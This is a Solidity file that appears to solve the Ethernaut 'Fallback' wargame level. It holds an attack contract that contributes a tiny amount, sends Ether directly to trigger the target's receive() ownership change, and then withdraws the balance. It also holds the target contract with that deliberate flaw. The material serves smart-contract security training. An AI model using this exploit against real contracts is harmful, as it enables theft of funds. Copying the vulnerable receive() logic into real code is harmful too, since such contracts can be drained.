// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthernautAttack {
    EthernautFallback target;
    address public targetAddress;

    constructor(address _EthernautFallback) {
        target = EthernautFallback(payable(_EthernautFallback));
        targetAddress = _EthernautFallback;
    }

    function Exploit() public payable {
        require(msg.value < 0.001 ether, "sending value must less than 0.001");
        uint contribution = target.getContribution();
        if (contribution == 0) {
            target.contribute{value: msg.value}();
        } else {
            (bool sent, ) = payable(targetAddress).call{value: msg.value}("");
            require(sent, "failed to send Ether");
            target.withdraw();
        }
    }

    receive() external payable {}
}

contract EthernautFallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
